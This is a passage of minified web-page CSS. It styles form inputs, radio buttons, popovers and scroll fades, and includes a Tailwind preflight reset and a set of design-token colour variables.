      ._2iCCN.O3DhZ {
        cursor: not-allowed;
      }

      ._2iCCN.O3DhZ ._3_iNE {
        border-color: #cad1d9;
      }

      ._2iCCN.O3DhZ ._3_iNE:checked ~ ._1T1yE {
        background-color: #cad1d9;
        border-width: 0;
      }

      ._2iCCN.O3DhZ ._1iJKV {
        color: #a8b4c0;
      }

      .ZlsP9 {
        border-radius: 4px;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-direction: row;
        -ms-flex-direction: row;
        flex-direction: row;
        height: 4rem;
        position: relative;
      }

      .ZlsP9.rdaLu {
        border: 1px solid #db4437;
      }

      .ZlsP9._2qHeo,
      .ZlsP9._2qHeo input {
        background-color: #f4f6f7;
        color: #cad1d9;
        cursor: not-allowed;
      }

      .ZlsP9 ._1p6Mu {
        left: 0;
        padding: 0 1.6rem;
      }

      .ZlsP9 ._1p6Mu,
      .ZlsP9 ._fbmQ {
        line-height: 0;
        position: absolute;
        top: 50%;
        -webkit-transform: translateY(-50%);
        -ms-transform: translateY(-50%);
        transform: translateY(-50%);
      }

      .ZlsP9 ._fbmQ {
        font-size: 1.2rem;
        padding: 0 0.8rem;
        right: 0;
      }

      .ZlsP9 input {
        border: none;
        border-radius: 4px;
        font-size: 1.4rem;
        height: 100%;
        min-width: 0;
        padding: 0 1rem;
        width: 100%;
      }

      .ZlsP9 input::-webkit-input-placeholder {
        color: #8191a0;
      }

      .ZlsP9 input::-moz-placeholder {
        color: #8191a0;
      }

      .ZlsP9 input:-ms-input-placeholder {
        color: #8191a0;
      }

      .ZlsP9 input::-ms-input-placeholder {
        color: #8191a0;
      }

      .ZlsP9 input::placeholder {
        color: #8191a0;
      }

      .ZlsP9 input:required {
        -webkit-box-shadow: none;
        box-shadow: none;
      }

      .yX2Vc {
        -webkit-box-flex: 1;
        -ms-flex-positive: 1;
        -ms-flex-item-align: center;
        -webkit-align-self: center;
        align-self: center;
        -webkit-flex-grow: 1;
        flex-grow: 1;
        margin-left: 0.8rem;
      }

      ._1alA0,
      .yX2Vc {
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        position: relative;
      }

      ._1alA0 {
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
      }

      ._1alA0 textarea {
        margin: 0;
      }

      ._3LMUM {
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        position: relative;
      }

      ._2zTJK {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        background-color: transparent;
        border: 1px solid #a8b4c0;
        border-radius: 4px;
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        color: #1a1a1a;
        font-family: Nunito Sans, sans-serif;
        font-size: 1.4rem;
        height: 4.8rem;
        outline: none;
        padding: 1.6rem;
        width: 100%;
        z-index: 2;
      }

      ._2zTJK::-webkit-input-placeholder {
        color: #8191a0;
      }

      ._2zTJK::-moz-placeholder {
        color: #8191a0;
      }

      ._2zTJK:-ms-input-placeholder {
        color: #8191a0;
      }

      ._2zTJK::-ms-input-placeholder {
        color: #8191a0;
      }

      ._2zTJK::placeholder {
        color: #8191a0;
      }

      .Yo6NQ,
      ._1YwKM,
      ._2bikJ,
      ._3COam,
      ._3GgKV,
      ._3yEKu,
      .dORE7 {
        -ms-flex-align: center;
        -webkit-align-items: center;
        align-items: center;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        height: 100%;
        position: absolute;
      }

      ._2bikJ {
        left: 1.6rem;
      }

      .Yo6NQ,
      ._1YwKM,
      ._3COam,
      ._3GgKV,
      ._3yEKu {
        right: 1.6rem;
      }

      ._1YwKM {
        cursor: pointer;
        z-index: 1000;
      }

      .Yo6NQ {
        color: #8191a0;
      }

      ._3COam,
      ._3yEKu {
        -ms-flex-align: start;
        -webkit-align-items: flex-start;
        align-items: flex-start;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        padding: 1.6rem;
        right: 0;
      }

      ._3yEKu {
        background-color: transparent;
        cursor: pointer;
        height: inherit;
        z-index: 2;
      }

      ._2DElF {
        -ms-flex-align: center;
        -webkit-align-items: center;
        align-items: center;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        height: 100%;
        left: 0;
        padding-left: 1.6rem;
        padding-right: 1.6rem;
        position: absolute;
      }

      ._1Y-5- {
        background-color: #fff;
        color: #8191a0;
        font-size: 1.4rem;
        margin-top: 0;
        -webkit-transition: top 0.2s, left 0.2s, background-color 0.2s,
          -webkit-transform 0.2s;
        transition: top 0.2s, left 0.2s, background-color 0.2s,
          -webkit-transform 0.2s;
        -o-transition: transform 0.2s, top 0.2s, left 0.2s,
          background-color 0.2s;
        transition: transform 0.2s, top 0.2s, left 0.2s, background-color 0.2s;
        transition: transform 0.2s, top 0.2s, left 0.2s, background-color 0.2s,
          -webkit-transform 0.2s;
        white-space: nowrap;
        z-index: 3;
      }

      ._19KGD ._1Y-5-,
      ._1Mgto,
      ._1eaC2 ._1Y-5- {
        font-size: 1.2rem;
        left: 1.6rem;
        padding-left: 0.4rem;
        padding-right: 0.4rem;
        position: absolute;
        top: 0;
        -webkit-transform: translate(-0.4rem, -50%);
        -ms-transform: translate(-0.4rem, -50%);
        transform: translate(-0.4rem, -50%);
      }

      ._36Ogi {
        -webkit-box-pack: justify;
        -ms-flex-pack: justify;
        grid-gap: 0.8rem;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-justify-content: space-between;
        justify-content: space-between;
        margin-top: 0.4rem;
        padding-left: 1.6rem;
        padding-right: 1.6rem;
      }

      ._1-A9M ._2DElF,
      ._1-A9M ._2zTJK {
        padding-left: 4rem;
      }

      ._1IiBC ._2zTJK,
      ._3bVzQ ._2zTJK {
        padding-right: 4rem;
      }

      ._1DrDD ._2zTJK {
        padding-right: 6.4rem;
      }

      ._19KGD ._2zTJK {
        border-color: #1a1a1a;
        -webkit-box-shadow: 0 0 0 1px #1a1a1a;
        box-shadow: 0 0 0 1px #1a1a1a;
      }

      ._19KGD .Yo6NQ,
      ._19KGD ._1Y-5-,
      ._1eaC2 ._1Y-5- {
        color: #1a1a1a;
      }

      ._3-y4m ._2zTJK {
        border-color: #cad1d9;
        color: #a8b4c0;
      }

      ._3-y4m ._1Y-5- {
        color: #a8b4c0;
      }

      ._1IiBC ._2zTJK {
        border-color: #c23f34;
        -webkit-box-shadow: none;
        box-shadow: none;
      }

      ._1IiBC ._1Y-5- {
        color: #c23f34;
      }

      ._1IiBC._19KGD ._2zTJK {
        border: 2px solid #c23f34;
      }

      ._1IiBC .Yo6NQ {
        color: #c23f34;
      }

      ._3fM1r {
        height: auto;
        min-height: 4.8rem;
        resize: none;
      }

      ._3fM1r + ._2DElF {
        -ms-flex-align: start;
        -webkit-align-items: flex-start;
        align-items: flex-start;
        padding-top: 1.6rem;
      }

      ._13omV {
        display: inline-block;
        position: relative;
      }

      ._13omV._1bDxG,
      ._13omV._26KFO {
        display: block;
        width: 100%;
      }

      ._13omV ._3mtHQ {
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        position: relative;
      }

      ._1bDxG._13omV ._3mtHQ {
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-flex-wrap: nowrap;
        -ms-flex-wrap: nowrap;
        flex-wrap: nowrap;
        overflow-x: auto;
      }

      @media (max-width: 768px) {
        ._1bDxG._13omV ._3mtHQ {
          -ms-overflow-style: none;
          overflow-y: hidden;
          scrollbar-width: none;
        }

        ._1bDxG._13omV ._3mtHQ::-webkit-scrollbar {
          display: none;
        }
      }

      ._29suh._13omV ._3mtHQ {
        overflow-y: auto;
      }

      ._3SUsb._13omV ._3mtHQ {
        padding-bottom: 0.8rem;
      }

      ._13omV ._2q_Dt,
      ._13omV ._2xnv_ {
        height: 5rem;
        pointer-events: none;
        position: absolute;
        -webkit-transition: height 0.3s ease-out;
        -o-transition: height 0.3s ease-out;
        transition: height 0.3s ease-out;
        width: 100%;
        z-index: 1;
      }

      ._13omV ._2q_Dt._2hvFF,
      ._13omV ._2xnv_._2hvFF {
        height: 0;
      }

      ._13omV ._2q_Dt {
        background-image: -o-linear-gradient(
          bottom,
          hsla(0, 0%, 100%, 0),
          #fff
        );
        background-image: -webkit-gradient(
          linear,
          left bottom,
          left top,
          from(hsla(0, 0%, 100%, 0)),
          to(#fff)
        );
        background-image: linear-gradient(0deg, hsla(0, 0%, 100%, 0), #fff);
        top: 0;
      }

      ._13omV ._2xnv_ {
        background-image: -o-linear-gradient(top, hsla(0, 0%, 100%, 0), #fff);
        background-image: -webkit-gradient(
          linear,
          left top,
          left bottom,
          from(hsla(0, 0%, 100%, 0)),
          to(#fff)
        );
        background-image: linear-gradient(180deg, hsla(0, 0%, 100%, 0), #fff);
        bottom: 0;
      }

      ._3SUsb._13omV ._2xnv_ {
        border-bottom: 1px solid #e6ebef;
      }

      ._13omV .SdTtA,
      ._13omV ._1VeLd {
        height: 100%;
        pointer-events: none;
        position: absolute;
        top: 0;
        -webkit-transition: width 0.3s ease-out;
        -o-transition: width 0.3s ease-out;
        transition: width 0.3s ease-out;
        width: 5rem;
      }

      ._13omV .SdTtA._2hvFF,
      ._13omV ._1VeLd._2hvFF {
        width: 0;
      }

      ._13omV ._1VeLd {
        background-image: -o-linear-gradient(right, hsla(0, 0%, 100%, 0), #fff);
        background-image: -webkit-gradient(
          linear,
          right top,
          left top,
          from(hsla(0, 0%, 100%, 0)),
          to(#fff)
        );
        background-image: linear-gradient(270deg, hsla(0, 0%, 100%, 0), #fff);
        left: 0;
      }

      ._13omV .SdTtA {
        background-image: -o-linear-gradient(left, hsla(0, 0%, 100%, 0), #fff);
        background-image: -webkit-gradient(
          linear,
          left top,
          right top,
          from(hsla(0, 0%, 100%, 0)),
          to(#fff)
        );
        background-image: linear-gradient(90deg, hsla(0, 0%, 100%, 0), #fff);
        right: 0;
      }

      ._3Rgki {
        -webkit-box-pack: justify;
        -ms-flex-pack: justify;
        -ms-flex-align: start;
        -webkit-align-items: flex-start;
        align-items: flex-start;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        font-size: 1.4rem;
        font-weight: 600;
        -webkit-justify-content: space-between;
        justify-content: space-between;
      }

      ._2GpA3 {
        -ms-flex-negative: 0;
        color: #8191a0;
        -webkit-flex-shrink: 0;
        flex-shrink: 0;
        font-size: 1.2rem;
        font-weight: 400;
        margin-left: 0.8rem;
      }

      ._1Mtm1,
      ._1Mtm1 ._2GpA3 {
        color: #cad1d9;
      }

      ._6Q7LS {
        cursor: pointer;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        margin: 0.8rem 0;
        padding-left: 0.2rem;
        position: relative;
      }

      ._6Q7LS._2EERM {
        width: 100%;
      }

      ._6Q7LS._2stnH {
        -ms-flex-align: start;
        -webkit-align-items: flex-start;
        align-items: flex-start;
      }

      ._6Q7LS._3x76l {
        -ms-flex-align: center;
        -webkit-align-items: center;
        align-items: center;
      }

      ._6Q7LS._1G3r- {
        -ms-flex-align: end;
        -webkit-align-items: flex-end;
        align-items: flex-end;
      }

      ._6Q7LS ._2yBor,
      ._6Q7LS ._30-Ie {
        vertical-align: top;
      }

      ._6Q7LS ._2yBor {
        color: #1a1a1a;
        display: inline-block;
        font-size: 1.4rem;
        margin-left: 0.8rem;
        margin-right: 1.6rem;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      ._6Q7LS ._2yBor._2EERM {
        width: 100%;
      }

      ._6Q7LS ._2yBor._2sWY4 {
        margin-left: 0;
        margin-right: 0;
      }

      ._6Q7LS ._30-Ie {
        -webkit-box-flex: 0;
        display: inline-block;
        -webkit-flex: 0 0 2rem;
        -ms-flex: 0 0 2rem;
        flex: 0 0 2rem;
        height: 2rem;
        position: relative;
        width: 2rem;
      }

      ._6Q7LS ._30-Ie ._30K_w,
      ._6Q7LS ._30-Ie ._3boJo {
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        vertical-align: top;
        width: 100%;
      }

      ._6Q7LS ._30-Ie ._3boJo {
        background: #fff;
        border: 2px solid #a8b4c0;
        border-radius: 50%;
        display: inline-block;
        outline: 4px solid transparent;
        position: relative;
        -webkit-transition: outline-color 0.1s ease-in,
          border-color 0.3s ease-in;
        -o-transition: outline-color 0.1s ease-in, border-color 0.3s ease-in;
        transition: outline-color 0.1s ease-in, border-color 0.3s ease-in;
      }

      ._6Q7LS ._30-Ie ._3boJo:before {
        border-radius: 50%;
        content: "";
        display: block;
        height: 0;
        left: 50%;
        position: absolute;
        top: 50%;
        -webkit-transform: translate(-50%, -50%);
        -ms-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        -webkit-transition: all 0.3s cubic-bezier(0.65, 0.17, 0.4, 1.27);
        -o-transition: all 0.3s cubic-bezier(0.65, 0.17, 0.4, 1.27);
        transition: all 0.3s cubic-bezier(0.65, 0.17, 0.4, 1.27);
        width: 0;
      }

      ._6Q7LS ._30-Ie ._30K_w {
        margin: 0;
        opacity: 0;
        pointer-events: none;
      }

      ._6Q7LS ._30-Ie ._30K_w:checked ~ ._3boJo:before {
        height: 1rem;
        width: 1rem;
      }

      ._6Q7LS ._30-Ie ._30K_w:checked ~ ._3boJo._1K4Dz {
        border-color: #4183d7;
      }

      ._6Q7LS ._30-Ie ._30K_w:checked ~ ._3boJo._1tF7A {
        border-color: #ff6e14;
      }

      ._6Q7LS ._30-Ie ._30K_w:checked ~ ._3boJo._1K4Dz:before {
        background: #4183d7;
      }

      ._6Q7LS ._30-Ie ._30K_w:checked ~ ._3boJo._1tF7A:before {
        background: #ff6e14;
      }

      ._6Q7LS ._30-Ie ._30K_w:hover:not(:disabled):not(:focus) ~ ._3boJo {
        outline-color: #e6ebef;
      }

      ._6Q7LS ._30-Ie ._30K_w:focus:not(:disabled) ~ ._3boJo {
        outline: 2px solid #1a1a1a;
      }

      ._6Q7LS
        ._30-Ie
        ._30K_w:checked:hover:not(:disabled):not(:focus)
        ~ ._3boJo._1K4Dz {
        outline-color: #d9e6f7;
      }

      ._6Q7LS
        ._30-Ie
        ._30K_w:checked:hover:not(:disabled):not(:focus)
        ~ ._3boJo._1tF7A {
        outline-color: #fef0e9;
      }

      ._6Q7LS._1bsts {
        cursor: not-allowed;
        opacity: 0.4;
      }

      ._1x_aE {
        display: inline;
      }

      ._9P_K2 {
        background: #fff;
        border-radius: 4px 4px 0 0;
        bottom: 0;
        -webkit-box-shadow: 0 -1px 4px 0 rgba(26, 26, 26, 0.08),
          0 4px 8px 0 rgba(26, 26, 26, 0.12);
        box-shadow: 0 -1px 4px 0 rgba(26, 26, 26, 0.08),
          0 4px 8px 0 rgba(26, 26, 26, 0.12);
        cursor: default;
        padding: 1.6rem 0;
        position: fixed;
        z-index: 1500;
      }

      ._9P_K2.sQm9u {
        width: auto;
      }

      ._9P_K2._2nsl3 {
        left: 0;
        right: auto;
      }

      ._9P_K2.VWhf4 {
        left: auto;
        right: 0;
      }

      ._9P_K2.ayieC {
        left: 0;
        margin-left: auto;
        margin-right: auto;
        right: 0;
      }

      ._9P_K2 ._2YJuL {
        padding: 0 1.6rem;
      }

      @media (min-width: 768px) {
        ._9P_K2 ._2YJuL._2JiyV._2nsl3:before {
          bottom: auto;
          top: -0.4rem;
          -webkit-transform: rotate(135deg);
          -ms-transform: rotate(135deg);
          transform: rotate(135deg);
          -webkit-transform-origin: center;
          -ms-transform-origin: center;
          transform-origin: center;
        }

        ._9P_K2 ._2YJuL._2JiyV._2nsl3._8rd9r:before,
        ._9P_K2 ._2YJuL._2JiyV._2nsl3:before {
          border-color: transparent transparent #fff #fff;
          border-style: solid;
          border-width: 6px;
          -webkit-box-shadow: -2px 2px 3px -1px rgba(0, 0, 0, 0.15);
          box-shadow: -2px 2px 3px -1px rgba(0, 0, 0, 0.15);
          content: "";
          height: 0;
          left: 6rem;
          position: absolute;
          width: 0;
        }

        ._9P_K2 ._2YJuL._2JiyV._2nsl3._8rd9r:before {
          bottom: -0.4rem;
          top: auto;
          -webkit-transform: rotate(315deg);
          -ms-transform: rotate(315deg);
          transform: rotate(315deg);
          -webkit-transform-origin: center;
          -ms-transform-origin: center;
          transform-origin: center;
        }

        ._9P_K2 ._2YJuL._2JiyV.VWhf4:before {
          bottom: auto;
          top: -0.4rem;
          -webkit-transform: rotate(135deg);
          -ms-transform: rotate(135deg);
          transform: rotate(135deg);
          -webkit-transform-origin: center;
          -ms-transform-origin: center;
          transform-origin: center;
        }

        ._9P_K2 ._2YJuL._2JiyV.VWhf4._8rd9r:before,
        ._9P_K2 ._2YJuL._2JiyV.VWhf4:before {
          border-color: transparent transparent #fff #fff;
          border-style: solid;
          border-width: 6px;
          -webkit-box-shadow: -2px 2px 3px -1px rgba(0, 0, 0, 0.15);
          box-shadow: -2px 2px 3px -1px rgba(0, 0, 0, 0.15);
          content: "";
          height: 0;
          position: absolute;
          right: 6rem;
          width: 0;
        }

        ._9P_K2 ._2YJuL._2JiyV.VWhf4._8rd9r:before {
          bottom: -0.4rem;
          top: auto;
          -webkit-transform: rotate(315deg);
          -ms-transform: rotate(315deg);
          transform: rotate(315deg);
          -webkit-transform-origin: center;
          -ms-transform-origin: center;
          transform-origin: center;
        }
      }

      ._9P_K2 ._2HoF8 {
        color: #a8b4c0;
        font-size: 1.4rem;
      }

      ._9P_K2 ._2HoF8 a {
        color: #4183d7;
      }

      ._9P_K2 ._3-_Yq {
        background-color: transparent;
        border: none;
        cursor: pointer;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        padding: 0;
        position: absolute;
        right: 1.8rem;
        top: 1.8rem;
      }

      ._9P_K2 ._3-_Yq:hover svg use {
        fill: #8191a0;
      }

      @media (min-width: 320px) {
        ._9P_K2._1-dWR {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2._1-dWR,
        ._9P_K2._1-dWR._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2._1-dWR._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 480px) {
        ._9P_K2._1AHMu {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2._1AHMu,
        ._9P_K2._1AHMu._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2._1AHMu._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 768px) {
        ._9P_K2._2IpIh {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2._2IpIh,
        ._9P_K2._2IpIh._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2._2IpIh._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 971px) {
        ._9P_K2._2tMnD {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2._2tMnD,
        ._9P_K2._2tMnD._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2._2tMnD._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 1024px) {
        ._9P_K2._1xPgA {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2._1xPgA,
        ._9P_K2._1xPgA._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2._1xPgA._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 1280px) {
        ._9P_K2.xH3pS {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2.xH3pS,
        ._9P_K2.xH3pS._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2.xH3pS._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 1600px) {
        ._9P_K2._1GeH9 {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2._1GeH9,
        ._9P_K2._1GeH9._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2._1GeH9._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      @media (min-width: 1920px) {
        ._9P_K2.aoH2Z {
          bottom: auto;
          top: 5rem;
        }

        ._9P_K2.aoH2Z,
        ._9P_K2.aoH2Z._8rd9r {
          border-radius: 4px;
          position: absolute;
        }

        ._9P_K2.aoH2Z._8rd9r {
          bottom: 5rem;
          top: auto;
        }
      }

      ._21uXc {
        background: rgba(0, 0, 0, 0.6);
        bottom: 0;
        height: 100%;
        left: 0;
        position: fixed;
        right: 0;
        top: 0;
        width: 100%;
        z-index: 1300;
      }

      ._3gnc3 .QHoLF {
        padding: 2.4rem 0 1.6rem;
      }

      ._3gnc3 .QHoLF ._2ikJJ {
        padding: 0 4.8rem 0 1.6rem;
      }

      @media (min-width: 768px) {
        ._3gnc3 .QHoLF {
          left: -5.8rem;
          top: 2.5rem;
          width: 30rem;
        }

        ._3gnc3 .QHoLF ._2ikJJ:before {
          bottom: auto;
          top: -0.4rem;
          -webkit-transform: rotate(135deg);
          -ms-transform: rotate(135deg);
          transform: rotate(135deg);
          -webkit-transform-origin: center;
          -ms-transform-origin: center;
          transform-origin: center;
        }

        ._3gnc3 .QHoLF ._2ikJJ._8rd9r:before,
        ._3gnc3 .QHoLF ._2ikJJ:before {
          border-color: transparent transparent #fff #fff;
          border-style: solid;
          border-width: 6px;
          -webkit-box-shadow: -2px 2px 3px -1px rgba(0, 0, 0, 0.15);
          box-shadow: -2px 2px 3px -1px rgba(0, 0, 0, 0.15);
          content: "";
          height: 0;
          left: 6rem;
          position: absolute;
          width: 0;
        }

        ._3gnc3 .QHoLF ._2ikJJ._8rd9r:before {
          bottom: -0.4rem;
          top: auto;
          -webkit-transform: rotate(315deg);
          -ms-transform: rotate(315deg);
          transform: rotate(315deg);
          -webkit-transform-origin: center;
          -ms-transform-origin: center;
          transform-origin: center;
        }
      }

      /*! tailwindcss v3.3.2 | MIT License | https://tailwindcss.com*/

      :after,
      :before {
        --tw-content: "";
      }

      html {
        line-height: 1.5;
        -webkit-text-size-adjust: 100%;
        -moz-tab-size: 4;
        -o-tab-size: 4;
        tab-size: 4;
        font-family: var(--font-family-sans);
        -webkit-font-feature-settings: normal;
        font-feature-settings: normal;
        font-variation-settings: normal;
      }

      body {
        margin: 0;
        line-height: inherit;
      }

      hr {
        height: 0;
        color: inherit;
        border-top-width: 1px;
      }

      abbr:where([title]) {
        -webkit-text-decoration: underline dotted;
        text-decoration: underline dotted;
      }

      h1,
      h2,
      h3,
      h4,
      h5,
      h6 {
        font-size: inherit;
        font-weight: inherit;
      }

      a {
        color: inherit;
        text-decoration: inherit;
      }

      b,
      strong {
        font-weight: bolder;
      }

      code,
      kbd,
      pre,
      samp {
        font-family: var(--font-family-mono);
        font-size: 1em;
      }

      small {
        font-size: 80%;
      }

      sub,
      sup {
        font-size: 75%;
        line-height: 0;
        position: relative;
        vertical-align: baseline;
        vertical-align: initial;
      }

      sub {
        bottom: -0.25em;
      }

      sup {
        top: -0.5em;
      }

      table {
        text-indent: 0;
        border-color: inherit;
        border-collapse: collapse;
      }

      button,
      input,
      optgroup,
      textarea {
        font-family: inherit;
        font-size: 100%;
        font-weight: inherit;
        line-height: inherit;
        color: inherit;
        margin: 0;
        padding: 0;
      }

      button {
        text-transform: none;
      }

      [type="button"],
      [type="reset"] {
        appearance: button;
        background-color: transparent;
        background-color: initial;
        background-image: none;
      }

      :-moz-focusring {
        outline: auto;
      }

      :-moz-ui-invalid {
        box-shadow: none;
      }

      progress {
        vertical-align: baseline;
        vertical-align: initial;
      }

      ::-webkit-inner-spin-button,
      ::-webkit-outer-spin-button {
        height: auto;
      }

      [type="search"] {
        -webkit-appearance: textfield;
        outline-offset: -2px;
      }

      ::-webkit-search-decoration {
        -webkit-appearance: none;
      }

      ::-webkit-file-upload-button {
        -webkit-appearance: button;
        font: inherit;
      }

      summary {
        display: list-item;
      }

      blockquote,
      dd,
      dl,
      fieldset,
      figure,
      h1,
      h2,
      h3,
      h4,
      h5,
      h6,
      hr,
      p,
      pre {
        margin: 0;
      }

      fieldset,
      legend {
        padding: 0;
      }

      menu,
      ol,
      ul {
        list-style: none;
        margin: 0;
        padding: 0;
      }

      textarea {
        resize: vertical;
      }

      input::-webkit-input-placeholder,
      textarea::-webkit-input-placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      input::-moz-placeholder,
      textarea::-moz-placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      input:-ms-input-placeholder,
      textarea:-ms-input-placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      input::-ms-input-placeholder,
      textarea::-ms-input-placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      input::placeholder,
      textarea::placeholder {
        opacity: 1;
        color: #9ca3af;
      }

      [role="button"],
      button {
        cursor: pointer;
      }

      :disabled {
        cursor: default;
      }

      audio,
      canvas,
      embed,
      iframe,
      img,
      object,
      svg,
      video {
        vertical-align: middle;
      }

      img,
      video {
        max-width: 100%;
        height: auto;
      }

      [hidden] {
        display: none;
      }

      :root {
        --border-radius-none: 0px;
        --border-radius-sm: 0.4rem;
        --border-radius-md: 0.8rem;
        --border-radius-lg: 1.6rem;
        --border-radius-xl: 2.4rem;
        --border-radius-full: 9999px;
        --border-width-none: 0px;
        --border-width-sm: 1px;
        --border-width-md: 2px;
        --box-shadow-sm: 0 1px 2px 0 #0003;
        --box-shadow-default: 0 4px 8px 0 #0003;
        --box-shadow-md: 0 6px 12px 0 #0003;
        --box-shadow-lg: 0 8px 16px 0 #0003;
        --box-shadow-xl: 0 12px 24px 0 #0003;
        --box-shadow-none: none;
        --colors-basic: 53 55 106;
        --colors-on-basic: 255 255 255;
        --colors-basic-hovered: 77 78 123;
        --colors-basic-pressed: 77 78 123;
        --colors-basic-focused: 77 78 123;
        --colors-basic-container: 220 220 229;
        --colors-on-basic-container: 29 31 42;
        --colors-basic-container-hovered: 244 244 247;
        --colors-basic-container-pressed: 244 244 247;
        --colors-basic-container-focused: 244 244 247;
        --colors-accent: 204 153 255;
        --colors-on-accent: 29 31 42;
        --colors-accent-hovered: 219 183 255;
        --colors-accent-pressed: 219 183 255;
        --colors-accent-focused: 219 183 255;
        --colors-accent-container: 234 213 255;
        --colors-on-accent-container: 54 37 85;
        --colors-accent-container-hovered: 249 243 255;
        --colors-accent-container-pressed: 249 243 255;
        --colors-accent-container-focused: 249 243 255;
        --colors-accent-variant: 81 56 119;
        --colors-on-accent-variant: 255 255 255;
        --colors-accent-variant-hovered: 110 77 153;
        --colors-accent-variant-pressed: 110 77 153;
        --colors-accent-variant-focused: 110 77 153;
        --colors-main: 0 82 255;
        --colors-on-main: 255 255 255;
        --colors-main-hovered: 56 120 255;
        --colors-main-pressed: 56 120 255;
        --colors-main-focused: 56 120 255;
        --colors-main-container: 194 214 255;
        --colors-on-main-container: 0 39 153;
        --colors-main-container-hovered: 242 246 255;
        --colors-main-container-pressed: 242 246 255;
        --colors-main-container-focused: 242 246 255;
        --colors-main-variant: 0 39 153;
        --colors-on-main-variant: 255 255 255;
        --colors-main-variant-hovered: 0 59 204;
        --colors-main-variant-pressed: 0 59 204;
        --colors-main-variant-focused: 0 59 204;
        --colors-support: 53 55 106;
        --colors-on-support: 255 255 255;
        --colors-support-hovered: 77 78 123;
        --colors-support-pressed: 77 78 123;
        --colors-support-focused: 77 78 123;
        --colors-support-container: 220 220 229;
        --colors-on-support-container: 29 31 88;
        --colors-support-container-hovered: 244 244 247;
        --colors-support-container-pressed: 244 244 247;
        --colors-support-container-focused: 244 244 247;
        --colors-support-variant: 152 34 83;
        --colors-on-support-variant: 255 255 255;
        --colors-support-variant-hovered: 202 46 110;
        --colors-support-variant-pressed: 202 46 110;
        --colors-support-variant-focused: 202 46 110;
        --colors-success: 49 165 107;
        --colors-on-success: 255 255 255;
        --colors-success-hovered: 100 188 144;
        --colors-success-pressed: 100 188 144;
        --colors-success-focused: 100 188 144;
        --colors-success-container: 224 242 233;
        --colors-on-success-container: 29 99 64;
        --colors-success-container-hovered: 245 251 248;
        --colors-success-container-pressed: 245 251 248;
        --colors-success-container-focused: 245 251 248;
        --colors-alert: 244 191 72;
        --colors-on-alert: 0 0 0;
        --colors-alert-hovered: 247 207 118;
        --colors-alert-pressed: 247 207 118;
        --colors-alert-focused: 247 207 118;
        --colors-alert-container: 253 245 228;
        --colors-on-alert-container: 146 115 43;
        --colors-alert-container-hovered: 255 252 246;
        --colors-alert-container-pressed: 255 252 246;
        --colors-alert-container-focused: 255 252 246;
        --colors-error: 246 86 81;
        --colors-on-error: 255 255 255;
        --colors-error-hovered: 248 128 125;
        --colors-error-pressed: 248 128 125;
        --colors-error-focused: 248 128 125;
        --colors-error-container: 254 230 229;
        --colors-on-error-container: 148 52 49;
        --colors-error-container-hovered: 255 247 246;
        --colors-error-container-pressed: 255 247 246;
        --colors-error-container-focused: 255 247 246;
        --colors-info: 7 160 184;
        --colors-on-info: 255 255 255;
        --colors-info-hovered: 69 184 202;
        --colors-info-pressed: 69 184 202;
        --colors-info-focused: 69 184 202;
        --colors-info-container: 218 241 244;
        --colors-on-info-container: 4 96 110;
        --colors-info-container-hovered: 243 250 252;
        --colors-info-container-pressed: 243 250 252;
        --colors-info-container-focused: 243 250 252;
        --colors-neutral: 123 121 134;
        --colors-on-neutral: 255 255 255;
        --colors-neutral-hovered: 156 155 164;
        --colors-neutral-pressed: 156 155 164;
        --colors-neutral-focused: 156 155 164;
        --colors-neutral-container: 235 235 237;
        --colors-on-neutral-container: 74 73 80;
        --colors-neutral-container-hovered: 248 248 249;
        --colors-neutral-container-pressed: 248 248 249;
        --colors-neutral-container-focused: 248 248 249;
        --colors-background: 255 255 255;
        --colors-on-background: 0 0 0;
        --colors-background-variant: 248 248 249;
        --colors-on-background-variant: 0 0 0;
        --colors-surface: 255 255 255;
        --colors-on-surface: 0 0 0;
        --colors-surface-hovered: 244 244 252;
